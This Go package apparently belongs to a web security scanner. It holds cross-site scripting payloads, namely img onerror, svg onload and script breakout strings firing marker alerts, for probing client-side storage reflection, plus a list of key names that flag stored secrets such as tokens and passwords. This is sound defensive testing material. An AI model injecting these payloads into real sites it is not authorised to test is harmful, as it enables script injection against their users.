// Package storageinj provides payloads for client-side storage injection testing.
// These payloads target localStorage, sessionStorage, document.cookie, and window.name
// to detect unsafe reflection of stored values into the DOM.
package storageinj

// StorageType identifies the client-side storage mechanism.
type StorageType string

const (
	LocalStorage   StorageType = "localStorage"
	SessionStorage StorageType = "sessionStorage"
	Cookie         StorageType = "cookie"
	WindowName     StorageType = "windowName"
)

// Payload represents a storage injection test payload.
type Payload struct {
	Value       string
	Marker      string // Unique marker to search for in DOM
	StorageType StorageType
	Description string
}

// GetPayloads returns storage injection payloads for the given storage type.
func GetPayloads(st StorageType) []Payload {
	var payloads []Payload
	for _, p := range allPayloads {
		if p.StorageType == st {
			payloads = append(payloads, p)
		}
	}
	return payloads
}

// GetAllPayloads returns all storage injection payloads.
func GetAllPayloads() []Payload {
	result := make([]Payload, len(allPayloads))
	copy(result, allPayloads)
	return result
}

// StorageTypes returns all storage types to test.
func StorageTypes() []StorageType {
	return []StorageType{LocalStorage, SessionStorage, Cookie, WindowName}
}

// allPayloads contains payloads for each storage type.
// Each uses a unique marker for DOM detection.
var allPayloads = []Payload{
	// localStorage payloads
	{
		Value:       `<img src=x onerror=alert('assay_ls_1')>`,
		Marker:      "assay_ls_1",
		StorageType: LocalStorage,
		Description: "localStorage: img tag with onerror",
	},
	{
		Value:       `<svg onload=alert('assay_ls_2')>`,
		Marker:      "assay_ls_2",
		StorageType: LocalStorage,
		Description: "localStorage: svg with onload",
	},
	{
		Value:       `"><script>alert('assay_ls_3')</script>`,
		Marker:      "assay_ls_3",
		StorageType: LocalStorage,
		Description: "localStorage: script tag breakout",
	},

	// sessionStorage payloads
	{
		Value:       `<img src=x onerror=alert('assay_ss_1')>`,
		Marker:      "assay_ss_1",
		StorageType: SessionStorage,
		Description: "sessionStorage: img tag with onerror",
	},
	{
		Value:       `<svg onload=alert('assay_ss_2')>`,
		Marker:      "assay_ss_2",
		StorageType: SessionStorage,
		Description: "sessionStorage: svg with onload",
	},
	{
		Value:       `"><script>alert('assay_ss_3')</script>`,
		Marker:      "assay_ss_3",
		StorageType: SessionStorage,
		Description: "sessionStorage: script tag breakout",
	},

	// cookie payloads
	{
		Value:       `<img src=x onerror=alert('assay_ck_1')>`,
		Marker:      "assay_ck_1",
		StorageType: Cookie,
		Description: "cookie: img tag with onerror",
	},
	{
		Value:       `<svg onload=alert('assay_ck_2')>`,
		Marker:      "assay_ck_2",
		StorageType: Cookie,
		Description: "cookie: svg with onload",
	},

	// window.name payloads
	{
		Value:       `<img src=x onerror=alert('assay_wn_1')>`,
		Marker:      "assay_wn_1",
		StorageType: WindowName,
		Description: "window.name: img tag with onerror",
	},
	{
		Value:       `<svg onload=alert('assay_wn_2')>`,
		Marker:      "assay_wn_2",
		StorageType: WindowName,
		Description: "window.name: svg with onload",
	},
}

// SensitiveKeyPatterns are patterns that indicate sensitive data in storage.
var SensitiveKeyPatterns = []string{
	"token",
	"jwt",
	"password",
	"passwd",
	"secret",
	"api_key",
	"apikey",
	"api-key",
	"access_token",
	"refresh_token",
	"auth",
	"session",
	"credential",
	"private",
	"ssn",
	"credit_card",
	"creditcard",
}
